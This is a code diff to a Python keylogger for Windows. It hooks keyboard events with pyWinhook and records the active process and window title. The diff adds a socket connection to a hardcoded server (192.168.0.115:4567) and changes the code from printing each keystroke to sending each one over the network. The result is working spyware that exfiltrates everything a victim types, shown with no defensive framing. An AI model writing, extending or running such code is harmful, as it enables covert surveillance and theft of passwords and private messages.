@@ -4,12 +4,16 @@ import pythoncom
 import pyWinhook as pyHook
 import time
 import win32clipboard
+import socket
 
 TIMEOUT = 60 * 10
+SERVER_ADDRESS = ('192.168.0.115', 4567)
 
 class KeyLogger:
     def __init__(self):
         self.current_window = None
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.connect(SERVER_ADDRESS)
 
     def get_current_process(self, hwnd):
         pid = c_ulong(0)
@@ -33,18 +37,16 @@ class KeyLogger:
         if event.WindowName != self.current_window:
             self.current_window = event.WindowName
             process_id, process_name, window_title = self.get_current_process(event.Window)
-            print(f"{process_id} {process_name} {window_title}")
+            log_message = f"{process_id} {process_name} {window_title}\n"
+            self.sock.sendall(log_message.encode())
 
         if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
+            key = chr(event.Ascii)
         else:
-            if event.Key == 'V':
-                win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
-                print(f'[PASTE] - {value}')
-            else:
-                print(f'{event.Key}')
+            key = event.Key
+
+        log_message = f"{key}\n"
+        self.sock.sendall(log_message.encode())
         return True
 
 def run():
@@ -58,7 +60,7 @@ def run():
     while time.time() - start_time < TIMEOUT:
         pythoncom.PumpWaitingMessages()
         time.sleep(0.1)
-    return "Time out."
+    return "Tempo limite atingido."
 
 if __name__ == '__main__':
     print(run())
